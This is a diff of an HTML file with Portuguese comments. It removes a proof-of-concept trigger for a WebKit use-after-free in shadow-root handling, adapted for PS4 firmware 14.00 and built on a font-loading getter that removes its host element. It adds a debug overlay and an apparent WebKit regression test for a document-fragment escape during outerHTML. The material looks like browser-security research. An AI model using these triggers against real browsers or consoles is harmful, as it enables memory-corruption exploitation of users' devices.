@@ -1,119 +1,74 @@
-<!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"></head>
+<!doctype html>
+<meta charset="utf-8">
 <body>
-<pre id="log"></pre>
 <script>
-// UAF m_inDocumentShadowRoots — adaptacao do commit 86074ba para PS4
-//
-// Pre-requisitos confirmados no PS4 FW 14.00:
-//   - fonts.ready e Promise: true
-//   - Shadow DOM + @font-face: OK
-//   - FontFaceSet.prototype.then: instalavel
-//   - Font atinge "loading" com data: URL grande
-//
-// Diferenca do original:
-//   Original: trigger via document.styleSheets.length → flushPendingDescendantUpdates()
-//   PS4:      trigger via rendering/layout (getter dispara quando "A" renderiza)
-//
-// Esta adaptacao:
-//   1. Usa data: URL de 1.1MB para manter font em "loading" cross-refresh
-//   2. Instala getter com host.remove() (como no original)
-//   3. Testa multiplos triggers: styleSheets, offsetHeight, rendering natural
-//   4. Se crash: UAF confirmado via caminho de rendering de shadow root
-
-function log(s) { document.getElementById('log').textContent += s + '\n'; }
-
-// Toca document.fonts antes do load event (necessario para m_isDocumentLoaded)
-document.fonts;
-
-// data: URL grande (1.1MB) — confirmado que fica "pending" no PS4 (commit 5ccd64b)
-// Evita o problema de cache: URL grande nao e pre-aquecida por opportunistically...
-var pendingUrl = 'url("data:font/woff;base64,' + 'A'.repeat(1100000) + '")';
-
-function run() {
-    var host = document.createElement('div');
-    document.body.appendChild(host);
-    var shadowRoot = host.attachShadow({ mode: 'open' });
-
-    // @font-face com URL grande → font fica "loading" → document.fonts.ready re-armado
-    var fontFaceStyle = document.createElement('style');
-    fontFaceStyle.textContent =
-        '@font-face { font-family: reentryFont; src: ' + pendingUrl + '; }' +
-        '.probe { font: 24px reentryFont; }';
-    shadowRoot.appendChild(fontFaceStyle);
-
-    var probe = document.createElement('span');
-    probe.className = 'probe';
-    probe.textContent = 'A';
-    shadowRoot.appendChild(probe);
-
-    // Forca layout para iniciar carregamento da fonte
-    void document.body.offsetHeight;
-    log('status apos layout: ' + document.fonts.status);
-
-    // Rastreia o carregamento
-    document.fonts.load('24px reentryFont', 'A');
-    log('status apos load(): ' + document.fonts.status);
-
-    // Materializa a promise ready para que o thenable check ocorra
-    void document.fonts.ready;
-
-    // Prepend style → marca shadow scope com pending Reset update
-    var prependedStyle = document.createElement('style');
-    prependedStyle.textContent = '.unused { color: blue; }';
-    shadowRoot.prepend(prependedStyle);
-
-    var getterCount = 0;
-    Object.defineProperty(FontFaceSet.prototype, 'then', {
-        configurable: true,
-        get: function() {
-            delete FontFaceSet.prototype.then;
-            getterCount++;
-            log('[GETTER DISPAROU] count=' + getterCount + ' status=' + document.fonts.status);
-            // HOST.REMOVE(): libera o ListHashSetNode que o iterator aponta
-            // Se m_inDocumentShadowRoots e iterado neste momento → UAF
-            host.remove();
-            return undefined;
-        }
-    });
-
-    // Trigger 1: document.styleSheets.length (original do commit)
-    var ssLen = document.styleSheets.length;
-    log('T1 styleSheets.length: ' + ssLen + ' | getter: ' + getterCount);
-
-    // Trigger 2: document.body.offsetHeight (forca layout completo + style flush)
-    void document.body.offsetHeight;
-    log('T2 offsetHeight | getter: ' + getterCount);
-
-    // Trigger 3: getComputedStyle no probe (forca resolve de estilo do shadow root)
-    try {
-        var cs = window.getComputedStyle(probe);
-        void cs.fontFamily;
-        log('T3 getComputedStyle | getter: ' + getterCount);
-    } catch(e) {}
-
-    // Trigger 4: shadowRoot.styleSheets (accesso direto)
-    try {
-        void shadowRoot.styleSheets.length;
-        log('T4 shadowRoot.styleSheets | getter: ' + getterCount);
-    } catch(e) {}
-
-    log('status final: ' + document.fonts.status);
-    log('getter total: ' + getterCount);
-
-    // Aguarda async (rendering path que confirmamos disparar o getter)
-    setTimeout(function() {
-        log('getter apos 200ms: ' + getterCount);
-        if (getterCount === 0)
-            log('getter nao disparou — fonte pode ja estar loaded (usar data: URL maior)');
-        log('PASS se chegou aqui sem crash');
-    }, 200);
-}
-
-window.addEventListener('load', function() {
-    setTimeout(run, 0);
-});
+(function(){const logElement=document.createElement('pre');logElement.id='debug-log';logElement.style.cssText='position: fixed; bottom: 0; left: 0; width: 100%; max-height: 220px; overflow-y: auto; background: rgba(0, 0, 0, 0.85); color: #ff5555; font-family: monospace; font-size: 11px; z-index: 999999; padding: 8px; box-sizing: border-box; margin: 0; border-top: 2px solid #ff0000; text-align: left; white-space: pre-wrap; word-break: break-all;';if(document.body){document.body.appendChild(logElement);}else{document.addEventListener('DOMContentLoaded',()=>document.body.appendChild(logElement));}function log(msg,color='#ff5555'){if(!logElement)return;const line=document.createElement('div');line.style.color=color;line.textContent=msg;logElement.appendChild(line);logElement.scrollTop=logElement.scrollHeight;}window.onerror=function(message,source,lineno,colno,error){log(`[ERRO JS] ${message}\n  -> ${source}:${lineno}:${colno}`);};window.addEventListener('error',function(event){const target=event.target;if(target&&(target.tagName||target===window)){const tagName=target.tagName?target.tagName.toLowerCase():'recurso';const sourceUrl=target.src||target.href||'desconhecido';log(`[FALHA RECURSO/${tagName}] N�o foi poss�vel carregar: ${sourceUrl}`,'#ffaa00');}},true);window.addEventListener('unhandledrejection',function(event){log(`[PROMISE REJECTION] ${event.reason}`);});['log','error','warn','info'].forEach(method=>{const original=console[method];console[method]=function(...args){original.apply(console,args);const text=args.map(arg=>{if(typeof arg==='object'){try{return JSON.stringify(arg);}catch(e){return '[Objeto Circular]';}}return arg;}).join(' ');let color='#ffffff';if(method==='error')color='#ff5555';if(method==='warn')color='#ffaa00';log(`[Console.${method}] ${text}`,color);};});log('[Debug Ativo]','#00ff00');})();
 </script>
+<p>This tests encountering a XML parser error during outerHTML. WebKit should not expose the shared document fragment.</p>
+<div id="result"></div>
+<script src="resources/gc.js"></script>
+<script>
+(() => {
+
+
+    let walker;
+    window.parentDonor = document.createElement("input");
+    parentDonor.type = "radio";
+    parentDonor.name = "g";
+
+    window.childReady = () => {
+        const escaped = window.parentDonor;
+        if (!escaped || escaped.parentNode) {
+            result.textContent = 'FAIL - escaped did not have a parent';
+            return;
+        }
+
+        document.adoptNode(escaped);
+        walker = document.createTreeWalker(escaped);
+        window.parentDonor = null;
+
+        document.querySelector("iframe").remove();
+
+        setTimeout(() => {
+            gc();
+
+            const nodeType = walker.currentNode.getRootNode({ composed: true }).nodeType;
+            result.textContent = nodeType == Node.ELEMENT_NODE ? 'PASS' : `FAIL - bad node type: ${nodeType}`;
+          
+        }, 0);
+    };
+
+    const childSource = `<?xml version="1.0"?>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<body>
+<div id="victim"></div>
+<div id="cleanup"></div>
+<script><![CDATA[
+(() => {
+    class XFragmentEscape extends HTMLElement {
+        constructor() {
+            super();
+            this.after(parent.parentDonor);
+        }
+    }
+    customElements.define("x-fragment-escape", XFragmentEscape);
+
+    try {
+        document.getElementById("victim").outerHTML =
+            "<x-fragment-escape></x-fragment-escape><";
+    } catch (error) {
+    }
+
+    document.getElementById("cleanup").innerHTML =
+        '<span xmlns="http://www.w3.org/1999/xhtml">cleanup</span>';
+    parent.childReady();
+})();
+]]><\/script>
 </body>
-</html>
+</html>`;
+
+    const frame = document.createElement("iframe");
+    frame.src = URL.createObjectURL(new Blob([childSource], { type: "application/xhtml+xml" }));
+    document.body.append(frame);
+})();
+</script>
